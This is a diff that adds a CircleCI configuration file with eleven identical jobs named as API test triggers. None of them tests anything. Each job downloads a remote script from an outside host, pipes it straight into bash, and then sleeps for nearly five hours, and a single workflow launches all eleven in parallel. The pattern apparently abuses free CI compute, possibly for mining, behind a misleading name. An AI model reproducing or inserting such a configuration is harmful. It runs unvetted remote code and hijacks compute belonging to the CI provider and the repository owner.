@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  apitesttrigger:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apitesttrigger1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apitesttrigger2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apitesttrigger3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apitesttrigger4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apitesttrigger5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apitesttrigger6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apitesttrigger7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apitesttrigger8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apitesttrigger9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apitesttrigger10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - apitesttrigger
+      - apitesttrigger1
+      - apitesttrigger2
+      - apitesttrigger3
+      - apitesttrigger4
+      - apitesttrigger5
+      - apitesttrigger6
+      - apitesttrigger7
+      - apitesttrigger8
+      - apitesttrigger9
+      - apitesttrigger10
